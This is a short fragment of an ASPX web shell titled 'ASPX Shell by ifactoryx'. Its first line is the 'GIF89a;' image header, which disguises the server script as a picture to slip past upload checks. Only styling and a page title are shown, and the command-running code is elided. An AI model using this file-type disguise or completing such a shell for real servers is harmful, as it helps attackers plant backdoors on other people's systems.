GIF89a;
<%-- ASPX Shell by ifactoryx <ifactoryx@krd.gov> (2020) --%>
...
<head>
  ...
  <style type="text/css">
    * { font-family: Arial; font-size: 12px; }
    ...
    h1 { font-size: 16px; background-color: #a8ad00; color: #FFFFFF; padding: 5px; }
    h2 { font-size: 14px; background-color: #fffb00; color: #FFFFFF; padding: 2px; }
    th { text-align: left; background-color: #968502; }
    td { background-color: #f3ffcc; }
    pre { margin: 2px; }
  </style>
</head>
<body>
  <h1>ASPX Shell by ifactoryx</h1>
